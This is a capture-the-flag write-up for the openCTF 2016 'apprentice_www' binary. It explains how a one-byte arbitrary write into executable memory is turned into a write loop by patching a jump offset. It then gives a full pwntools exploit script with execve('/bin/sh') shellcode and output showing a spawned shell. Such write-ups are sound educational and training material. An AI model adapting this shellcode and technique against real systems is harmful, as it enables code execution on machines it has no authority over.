---
layout: post
title: openCTF 2016 - apprentice_www
category: [Exploitation]
tags: [Exploitation, openCTF]
comments: true
---

**Points:** 300
**Solves:** 
**Category:** Exploitation
**Description:**

> [apprentice_www]({{site.url}}/assets/apprentice_www_9cc7495fae4a9b23db4c7595865af973)

In `main()` right after the typical calls to setvbuf for STDIN and STDOUT we have a `setup` function.
{% highlight C %} 
void setup(int addr_of_main) {
    for (counter = 0x0; counter <= 0x2; counter = counter + 0x1) {
            mprotect((addr_of_main & 0x8048000) + (counter << 0xc), 0x1000, 0x7);
    }
    return;
}
{% endhighlight %}

What `setup` does is, it sets the permissions of the .text .data and .bss sections to read, write and execute.
The function after `setup` is `butterflySwag`. This function takes 2 input variables. An address and a 1 byte value. It writes the 1 byte value to the address we specify and returns.

{% highlight C %}
int butterflySwag() {
  __isoc99_scanf("%u", addr);
  __isoc99_scanf("%d", byte);
  byte = byte & 0xff;
  *(int8_t *)addr = byte;
  if (byte == 0x0) {
    puts("That which does not kill us makes us stronger.");
  }
  else {
    if (byte == 0x1) {
      puts("All truly great thoughts are conceived by walking.");
    }
    else {
      if (byte <= 0x4) {
        puts("Without music, life would be a mistake.");
      }
      else {
        if (byte <= 0x9) {
          puts("He who has a why to live can bear almost any how.");
        }
        else {
          puts("When you look into an abyss, the abyss also looks into you.");
        }
      }
    }
  }
  return 0x0;
}
{% endhighlight %}

![butterflySwag]({{site.url}}/assets/screen-openctf-1.png)

# Solution

So we have a 1 byte patch anywhere in the binary including the .text segment. Of course we can't get a shell with just a single byte, so let's make a way to get more bytes in there. Since one of following if statements are conveniently close to the code taking input and considering they are all short conditional jumps which are a 1 byte opcode `0x75` (for the JNE) followed by 1 byte signed char distance to jump we can patch the first if statement with a negative byte distance to jump back if `byte != 0`.

After calculating the negative distance to jump back, the disassembly looks like this:

![jump-back]({{site.url}}/assets/screen-openctf-2.png)

Now that we can patch unlimited number of bytes while `byte != 0` let's write some shellcode byte by byte right after the conditional jump back and get out of this loop by sending `byte == 0`.

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
  r.sendline(str(0x080485da))
  r.sendline(str(0xc2))

  sc_addr = 0x080485db
  sc = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
      "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

  for c in range(len(sc)):
    r.sendline( str(sc_addr+c) )
    r.sendline( str(ord(sc[c])) )

  r.sendline(str(0x08048500))
  r.sendline(str(0))

  r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/apprentice_www_9cc7495fae4a9b23db4c7595865af973'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

{% highlight text %}
➜  openCTF python ./apprentice_www_solution.py
[*] For remote: ./apprentice_www_solution.py HOST PORT
[+] Starting program '/vagrant/openCTF/apprentice_www_9cc7495fae4a9b23db4c7595865af973': Done
[21612]
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
$
{% endhighlight %}
